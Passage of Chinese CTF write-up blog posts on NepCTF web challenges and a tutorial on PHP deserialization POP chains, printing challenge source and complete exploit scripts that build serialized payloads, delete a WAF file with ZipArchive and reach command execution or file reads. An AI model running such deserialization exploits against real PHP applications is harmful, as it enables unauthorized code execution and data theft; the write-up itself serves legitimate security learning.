<h2 id="bbxhh-revenge"><a href="#bbxhh-revenge" class="headerlink" title="bbxhh_revenge"></a>bbxhh_revenge</h2><p>这题写的是挺无语的，要一直换ip，我是用利用手机换飞行模式，再换回来，ip会改变，然后用流量放热点达到更换ip的效果:</p>
<p>然后下面在尝试参数的是比较难受的，感觉有点脑洞，我也是在尝试的过程中 多加了一个一个imagin的参数，画面回显才有不同，接下来就和学长一起讨论往下做。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210323194012.png" alt="img" style="zoom:67%;"></p>
<p><strong>非预期解</strong></p>
<p>这个也是后来才知道的:在尝试参数的过程中 他有说一句话:<br>你已经可以得到phpinfo了，但是当时没理解这句话的意思，后来才知道，原来在imagin后加上函数才可以打开</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210323200009.png" alt="img"><br><strong>预期解</strong>:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$s</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> preg_replace(<span class="string">&#x27;/sys|exec|sh|flag|pass|file|open|dir|2333|;|#|\/\/|&gt;/i&#x27;</span>,<span class="string">&quot;NepnEpneP&quot;</span>,$s);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">    $_=waf($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    $__=waf($_GET[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line">    $a=<span class="keyword">new</span> $_($__);<span class="comment">//new XMLReader</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>])&amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;d&#x27;</span>]))&#123;</span><br><span class="line">    $c=waf($_GET[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    $d=waf($_GET[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$a</span>-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>)&quot;</span>);<span class="comment">//XMLReader -&gt; open(&#x27;data.xml&#x27;)</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $c=<span class="string">&#x27;getMesssage&#x27;</span>;</span><br><span class="line">    $d=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo <span class="subst">$a</span>-&gt;<span class="subst">$c</span>(<span class="subst">$d</span>);&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>拿到源码和学长想的是利用内置类，但是有个参数问题没法解决，所以还在等正经wp</p>
<h2 id="梦里花开牡丹亭"><a href="#梦里花开牡丹亭" class="headerlink" title="梦里花开牡丹亭"></a>梦里花开牡丹亭</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username;</span><br><span class="line">    <span class="keyword">public</span>  $password;</span><br><span class="line">    <span class="keyword">public</span>  $choice;</span><br><span class="line">    <span class="keyword">public</span>  $register;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//这个是md5加密，解密后为admin，那这里应该就需要传入个admin</span></span><br><span class="line">        <span class="keyword">if</span>(md5(<span class="keyword">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice=<span class="keyword">new</span> login(<span class="keyword">$this</span>-&gt;file,<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);<span class="comment">//新建一个login类</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;choice = <span class="keyword">new</span> register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;choice-&gt;checking(<span class="keyword">$this</span>-&gt;username,<span class="keyword">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file,$filename,$content</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file=$file;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename=$filename;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content=$content;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;<span class="comment">//在checking里面会检查username和password，</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;file-&gt;open(<span class="keyword">$this</span>-&gt;filename,<span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);<span class="comment">//成功了才可以打开。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params">$username,$password</span>)//这边就会检查了</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($username===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;$password===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;please register admin &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">$filename, $content</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_get_contents(<span class="string">&#x27;waf.txt&#x27;</span>))&#123;</span><br><span class="line">            shell($content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents($filename.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;a&#x27;</span>]!==$_GET[<span class="string">&#x27;b&#x27;</span>]&amp;&amp;(md5($_GET[<span class="string">&#x27;a&#x27;</span>]) === md5($_GET[<span class="string">&#x27;b&#x27;</span>])) &amp;&amp; (sha1($_GET[<span class="string">&#x27;a&#x27;</span>])=== sha1($_GET[<span class="string">&#x27;b&#x27;</span>])))&#123;</span><br><span class="line">    @unserialize(base64_decode($_POST[<span class="string">&#x27;unser&#x27;</span>]));</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这个是反序列化漏洞，但是我反序列化漏洞只是学了一个比较简单_wakeup()函数的绕过，试着做一下这题,本来想看着学长们的wp做，但是想了一下，反序列化问题有遇到过了，还是尝试自己做一下</p>
<h4 id="POP链条"><a href="#POP链条" class="headerlink" title="POP链条"></a>POP链条</h4><p>1.反序列化触发wake_up方法，wake_up方法中做了一个判断，我们输入的admin的时候将会跳转到login类当中，会先使用construct方法，对各个变量进行赋值<br>2.接下来将就会返回到Game类中调用_destruct调用方法，又进入到checking类中<br>3.此时将会调用checking方法，这里有个参数 file，我们要对file赋值让他进入Open类中调用file_get_contents函数</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username;</span><br><span class="line">    <span class="keyword">public</span>  $password;</span><br><span class="line">    <span class="keyword">public</span>  $choice;</span><br><span class="line">    <span class="keyword">public</span>  $register;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Game;</span><br><span class="line">$b=<span class="keyword">new</span> Open;</span><br><span class="line">$a-&gt;register=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">$a-&gt;filename=<span class="string">&quot;shell&quot;</span>;</span><br><span class="line">$a-&gt;file=$b;</span><br><span class="line">$a-&gt;username=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">$a-&gt;password=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">print</span>(base64_encode(serialize($a)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来会获得以下文件:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shell</span>(<span class="params">$cmd</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($cmd)&lt;<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/cat|tac|more|less|head|tail|nl|tail|sort|od|base|awk|cut|grep|uniq|string|sed|rev|zip|\*|\?/&#x27;</span>,$cmd))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> system($cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;so long!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原来这段代码还没结束，还有下文，这里有个shell方法是在我们上面那个判断语句当中的，当waf.txt不存在的时候才会调用这个shell方法现在我们需要删除这个waf.txt，由于以上没有我们可以利用的类，所以这里很明显需要使用内置类进行删除（跟那个bbxhh-revenge有神似的地方）这里需要寻找一个能直接删除的内置类:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210325174128.png" alt="img" style="zoom:50%;"></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210325181139.png" alt="img" style="zoom:67%;">
利用此代码即可删除
所以序列化一下：

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $username;</span><br><span class="line">    <span class="keyword">public</span>  $password;</span><br><span class="line">    <span class="keyword">public</span>  $choice;</span><br><span class="line">    <span class="keyword">public</span>  $register;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  $file;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span>  $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Open</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> Game;</span><br><span class="line"><span class="comment">//$b=new Open;</span></span><br><span class="line">$zip=<span class="keyword">new</span> ZipArchive();</span><br><span class="line"></span><br><span class="line">$a-&gt;register=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">$a-&gt;filename=<span class="string">&quot;waf.txt&quot;</span>;</span><br><span class="line">$a-&gt;content=ZipArchive::OVERWRITE;<span class="comment">//这里记得不能加引号</span></span><br><span class="line">$a-&gt;file=$zip;</span><br><span class="line">$a-&gt;username=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line">$a-&gt;password=<span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="keyword">print</span>(base64_encode(serialize($a)));</span><br></pre></td></tr></table></figure>

<p>接下来就是写入代码执行shell了 在反序列化那边对content参数进行修改（用得是第一个反序列化代码），执行ls没找到flag应该是在根目录了，然后<code>ls / </code>发现flag目录 感觉flag就在里面了，于是使用<br>php /flag即可打开</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210325203542.png" alt="img" style="zoom:67%;">



]]></content>
  </entry>
  <entry>
    <title>php反序列化pop链构造</title>
    <url>/2021/03/25/php-pop%E9%93%BE%E6%9E%84%E9%80%A0/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h2><p>nep比赛做了很多关于类的调用以及反序列化问题，正好这块内容是我还没学习的（早知道寒假的时候就耐着性子学完了），于是趁着部门的工作今天还没安排，决定赶紧开始做一下。<a id="more"></a></p>
<h2 id="pop链介绍"><a href="#pop链介绍" class="headerlink" title="pop链介绍"></a>pop链介绍</h2><p>从现有类中寻找我们可以恶意使用的方法、函数，构造利用链，使得程序会按着我们的需要最终执行恶意语句</p>
<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><table>
<thead>
<tr>
<th align="left">方法名</th>
<th align="left">调用条件</th>
</tr>
</thead>
<tbody><tr>
<td align="left">__call</td>
<td align="left">调用不可访问或不存在的方法时被调用</td>
</tr>
<tr>
<td align="left">__callStatic</td>
<td align="left">调用不可访问或不存在的静态方法时被调用</td>
</tr>
<tr>
<td align="left">__clone</td>
<td align="left">进行对象clone时被调用，用来调整对象的克隆行为</td>
</tr>
<tr>
<td align="left">__constuct</td>
<td align="left">构建对象的时被调用；</td>
</tr>
<tr>
<td align="left">__debuginfo</td>
<td align="left">当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本</td>
</tr>
<tr>
<td align="left">__destruct</td>
<td align="left">明确销毁对象或脚本结束时被调用；</td>
</tr>
<tr>
<td align="left">__get</td>
<td align="left">读取不可访问或不存在属性时被调用</td>
</tr>
<tr>
<td align="left">__invoke</td>
<td align="left">当以函数方式调用对象时被调用</td>
</tr>
<tr>
<td align="left">__isset</td>
<td align="left">对不可访问或不存在的属性调用isset()或empty()时被调用</td>
</tr>
<tr>
<td align="left">__set</td>
<td align="left">当给不可访问或不存在属性赋值时被调用</td>
</tr>
<tr>
<td align="left">__set_state</td>
<td align="left">当调用var_export()导出类时，此静态方法被调用。用__set_state的返回值做为var_export的返回值。</td>
</tr>
<tr>
<td align="left">__sleep</td>
<td align="left">当使用serialize时被调用，当你不需要保存大对象的所有数据时很有用</td>
</tr>
<tr>
<td align="left">__toString</td>
<td align="left">当一个类被转换成字符串时被调用</td>
</tr>
<tr>
<td align="left">__unset</td>
<td align="left">对不可访问或不存在的属性进行unset时被调用</td>
</tr>
<tr>
<td align="left">__wakeup</td>
<td align="left">当使用unserialize时被调用，可用于做些对象的初始化操作</td>
</tr>
</tbody></table>
<h4 id="3-反序列化的常见起点"><a href="#3-反序列化的常见起点" class="headerlink" title="3.反序列化的常见起点"></a>3.反序列化的常见起点</h4><p>__wakeup 一定会调用</p>
<p>__destruct 一定会调用</p>
<p>__toString 当一个对象被反序列化后又被当做字符串使用</p>
<h4 id="4-反序列化的常见中间跳板"><a href="#4-反序列化的常见中间跳板" class="headerlink" title="4.反序列化的常见中间跳板:"></a>4.反序列化的常见中间跳板:</h4><p>__toString 当一个对象被当做字符串使用</p>
<p>__get 读取不可访问或不存在属性时被调用</p>
<p>__set 当给不可访问或不存在属性赋值时被调用</p>
<p>__isset 对不可访问或不存在的属性调用isset()或empty()时被调用</p>
<p>形如 $this-&gt;$func();</p>
<h4 id="5-反序列化的常见终点"><a href="#5-反序列化的常见终点" class="headerlink" title="5.反序列化的常见终点:"></a>5.反序列化的常见终点:</h4><p>__call 调用不可访问或不存在的方法时被调用</p>
<p>call_user_func 一般php代码执行都会选择这里</p>
<p>call_user_func_array 一般php代码执行都会选择这里</p>
<h4 id="6-Phar反序列化原理以及特征"><a href="#6-Phar反序列化原理以及特征" class="headerlink" title="6.Phar反序列化原理以及特征"></a>6.Phar反序列化原理以及特征</h4><p>phar://伪协议会在多个函数中反序列化其metadata部分<br>受影响的函数包括不限于如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy,file_exists,file_get_contents,file_put_contents,file,fileatime,filectime,filegroup,</span><br><span class="line">fileinode,filemtime,fileowner,fileperms,</span><br><span class="line">fopen,is_dir,is_executable,is_file,is_link,is_readable,is_writable,</span><br><span class="line">is_writeable,parse_ini_file,readfile,stat,unlink,exif_thumbnailexif_imagetype,</span><br><span class="line">imageloadfontimagecreatefrom,hash_hmac_filehash_filehash_update_filemd5_filesha1_file,</span><br><span class="line">get_meta_tagsget_headers,getimagesizegetimagesizefromstring,extractTo</span><br></pre></td></tr></table></figure>

<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        <span class="keyword">return</span> $text;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $content = <span class="keyword">$this</span>-&gt;file_get(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">        <span class="keyword">echo</span> $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;index.php&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">&#x27;Welcome&#x27;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;</span>,<span class="keyword">$this</span>-&gt;source)) 		 &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            highlight_file(<span class="keyword">$this</span>-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params">$key</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;hello&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[<span class="string">&#x27;hello&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    $show = <span class="keyword">new</span> Show(<span class="string">&#x27;pop3.php&#x27;</span>);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>思路：寻找目标函数——进行回溯——构造利用链</strong></p>
<p>1.反序列化将会触发wake_up函数，而wake_up函数在show类当中<br>2.show类中的wake_up函数执行时将会经过一个正则匹配，这里匹配的是source这个量，而正则匹配的时候source是被当做字符串进行匹配的，前面有说过如果__tostring的触发方式，所以这里如果我们将source赋为一个类对象，那么就会触发__tostring<br>3.这里的tostring会去寻找str这个数组，取出其中的值赋给source，如果找不到就会触发__get方法，我们再来看看get在哪，在test类当中<br>4.这里的get方法他是获取一个p并将其作为函数使用的，这里就会调用__invoke魔术方法<br>5.而__invoke魔术方法存在于Read类中，这里调用了file_get方法后调用了file_get_content读取文件，而这里的参数是我们可控的，所以我们的pop利用链如下:<br><strong>POP链</strong>：<br>unserialize函数（变量可控）-&gt;__wakeup()魔术方法-&gt;__tostring()-&gt;__get魔术方法-&gt;__invoke魔术方法-&gt;触发read类中的file_get_contents函数</p>
<h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var=<span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line">$r=<span class="keyword">new</span> Read();</span><br><span class="line">$s=<span class="keyword">new</span> Show();</span><br><span class="line">$t=<span class="keyword">new</span> Test();</span><br><span class="line">$t-&gt;p=$r;<span class="comment">//赋值Test类的对象$t下的属性p为Read类的对象($r),触发__invoke魔术方法</span></span><br><span class="line">$s-&gt;str[<span class="string">&#x27;str&#x27;</span>]=$t;<span class="comment">//赋值show类的对象（$s）下的str数组的str键的值为Test类的对象$t，触发__get魔术方法。</span></span><br><span class="line">$s-&gt;source=$s;<span class="comment">//令show类中的对象$s下的source属性进入wake_up函数，这样就会触发tostring魔术方法</span></span><br><span class="line"><span class="keyword">echo</span> urlencode((serialize($s)));	</span><br></pre></td></tr></table></figure>

<h2 id="nep——梦里花开牡丹亭"><a href="#nep——梦里花开牡丹亭" class="headerlink" title="nep——梦里花开牡丹亭"></a>nep——梦里花开牡丹亭</h2><p>跳转战场，回去构造一下nep的题</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&#39;shell.php&#39;);</span><br><span class="line">class Game&#123;</span><br><span class="line">    public  $username;</span><br><span class="line">    public  $password;</span><br><span class="line">    public  $choice;</span><br><span class="line">    public  $register;</span><br><span class="line"></span><br><span class="line">    public  $file;</span><br><span class="line">    public  $filename;</span><br><span class="line">    public  $content;</span><br><span class="line">    </span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username&#x3D;&#39;user&#39;;</span><br><span class="line">        $this-&gt;password&#x3D;&#39;user&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()&#123;     admin</span><br><span class="line">        if(md5($this-&gt;register)&#x3D;&#x3D;&#x3D;&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123;</span><br><span class="line">            $this-&gt;choice&#x3D;new login($this-&gt;file,$this-&gt;filename,$this-&gt;content);&#x2F;&#x2F;新建一个login类</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;choice &#x3D; new register();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class login&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $filename;</span><br><span class="line">    public $content;</span><br><span class="line"></span><br><span class="line">    public function __construct($file,$filename,$content)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;file&#x3D;$file;</span><br><span class="line">        $this-&gt;filename&#x3D;$filename;</span><br><span class="line">        $this-&gt;content&#x3D;$content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function checking($username,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        if($username&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;$password&#x3D;&#x3D;&#x3D;&#39;admin&#39;)&#123;</span><br><span class="line">            $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content);</span><br><span class="line">            die(&#39;login success you can to open shell 